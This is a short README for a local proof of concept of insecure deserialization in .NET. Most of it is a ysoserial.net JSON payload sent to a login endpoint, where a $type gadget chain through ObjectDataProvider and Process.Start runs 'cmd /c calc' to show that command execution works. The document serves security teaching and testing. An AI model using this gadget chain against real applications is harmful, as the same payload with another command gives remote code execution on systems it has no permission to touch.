##### This is a small poc about Insecure Deserialization in .Net.
##### How to use this:
* Download this code
* Open it with Microsoft VS
* Run
* Send this payload (create by ysoserial.net) to localhost:[port]//Account/Login:
  ```
  {
    "username": {
        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName": "Start",
        "MethodParameters": {
            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "$values": [
                "cmd",
                "/c calc"
            ]
        },
        "ObjectInstance": {
            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        }
    },
    "password": "dummy"
  }
  ```
